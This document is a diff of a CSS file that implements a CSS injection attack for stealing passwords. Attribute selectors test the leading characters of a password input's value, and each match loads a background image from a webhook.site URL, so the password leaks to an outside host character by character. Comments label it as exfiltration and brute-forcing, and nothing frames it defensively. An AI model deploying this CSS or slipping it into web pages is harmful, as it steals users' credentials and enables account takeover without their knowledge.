@@ -1,19 +1,19 @@
-@import url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start");
+/* Start the exfil — to confirm load */
+body { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start"); }
 
-/* Try all lowercase letters */
-input[name=password][value^="a"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/a");
+/* Brute-force first character of password */
+input[type="password"][value^="a"] {
+    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/a");
 }
-input[name=password][value^="b"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/b");
+input[type="password"][value^="b"] {
+    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/b");
 }
-/* ...repeat for all letters, digits, and symbols... */
+input[type="password"][value^="c"] {
+    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/c");
+}
+/* …repeat for all possible characters… */
 
-/* Try digits */
-input[name=password][value^="0"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/0");
+/* You can then extend to guess the 2nd char: */
+input[type="password"][value^="aa"] {
+    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/aa");
 }
-input[name=password][value^="1"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/1");
-}
-/* etc. */
